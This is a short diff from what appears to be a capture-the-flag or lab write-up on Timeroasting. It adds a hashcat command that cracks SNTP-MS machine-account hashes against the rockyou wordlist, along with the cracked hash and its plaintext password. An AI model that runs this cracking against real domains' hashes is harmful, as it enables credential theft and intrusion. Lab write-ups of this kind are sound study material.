@@ -217,5 +217,13 @@ $sntp-ms$e2796824b459f246f17d6c9300da4aac$1c0111e900000000000a04a34c4f434cee7ea5
 I placed the output into a file, then ill cut the output so they are crackable
 
 ```python
+ ❯❯❯ hashcat timeroast.hash /usr/share/wordlists/rockyou.txt -m 31300
+ 
+ $sntp-ms$890ca6c9c139f7f2d3c6ac3d2b7eb415$1c0111e900000000000a04a34c4f434cee7ea5eff9ba4002e1b8428bffbfcd0aee7eac0db5e310dbee7eac0db5e349e6:Rusty88!
+```
+
+Only one of them cracked
+
+```python
 
 ```
